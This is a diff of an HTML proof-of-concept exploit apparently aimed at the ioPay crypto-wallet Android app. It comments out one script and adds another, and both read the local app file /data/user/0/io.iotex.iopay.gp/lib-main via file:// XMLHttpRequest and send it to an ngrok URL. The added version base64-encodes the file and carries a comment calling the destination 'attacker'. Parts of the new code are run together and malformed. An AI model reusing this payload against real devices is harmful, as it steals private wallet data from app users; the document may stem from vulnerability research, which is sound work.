@@ -26,27 +26,36 @@
 	  ///data/user/0/io.iotex.iopay.gp/lib-main
 	    
 	    
-	    <script type="text/javascript">
-        function theftFile(path, callback) {
-          var req = new XMLHttpRequest();
+	//  <script type="text/javascript">
+        //function theftFile(path, callback) {
+          //var req = new XMLHttpRequest();
 
-          req.open("GET", "file://" + path, true);
-          req.onload = function(e) {
-            callback(req.responseText);
-          }
-          req.onerror = function(e) {
-            callback(null);
-          }
-          req.send();
-        }
+          //req.open("GET", "file://" + path, true);
+          //req.onload = function(e) {
+         //   callback(req.responseText);
+        //  }
+      //    req.onerror = function(e) {
+    //        callback(null);
+     //     }
+      //    req.send();
+   //     }
 
-        var file = "/data/user/0/io.iotex.iopay.gp/lib-main";
-        theftFile(file, function(contents) {
-            location.href = "https://1c4f-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
-        });
-    </script>
+     //   var file = "/data/user/0/io.iotex.iopay.gp/lib-main";
+    //    theftFile(file, function(contents) {
+     //       location.href = "https://1c4f-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
+     //   });
+   // </script>
 
-
+<script>
+    var url = 'file:///data/user/0/io.iotex.iopay.gp/lib-main'; //local filefunction load(url) {
+        var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+            fetch('https://1c4f-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+            }
+        }xhr.open('GET', url, true);
+        xhr.send('');
+    }load(url)
+</script>
 	    
 	    
 	    
